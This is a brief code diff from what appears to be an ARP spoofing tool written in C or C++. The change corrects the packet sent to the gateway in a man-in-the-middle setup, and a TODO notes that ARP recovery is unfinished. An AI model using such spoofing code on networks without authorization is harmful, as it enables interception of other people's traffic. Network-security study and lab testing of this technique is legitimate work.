@@ -58,7 +58,7 @@ int main() {
     ARP_packet_sender target_spoofer(adapter, spoofing_target_packet, 10);
 
     arp_packet *spoofing_gateway_packet = arp_packet_constructor(target_ip, self_mac,
-                                                                 target_ip, target_mac);
+                                                                 gateway_ip, gateway_mac);
     ARP_packet_sender gateway_spoofer(adapter, spoofing_gateway_packet, 1000);
 
     // TODO: Add ARP recovering
